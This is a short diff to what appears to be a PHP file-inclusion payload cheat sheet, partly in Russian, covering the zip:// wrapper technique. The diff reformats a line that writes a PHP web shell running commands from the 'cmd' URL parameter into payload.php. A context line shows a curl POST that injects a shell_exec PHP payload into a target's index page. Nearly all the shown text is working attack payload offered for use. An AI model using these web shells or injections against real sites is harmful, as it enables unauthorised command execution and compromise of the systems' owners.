@@ -108,7 +108,7 @@ curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index
 
 # Wrapper zip://
 
-* Создай вредоносную полезную нагрузку: echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
+* Payload: ```echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php```;
 
 * Заархивируй файл:
 
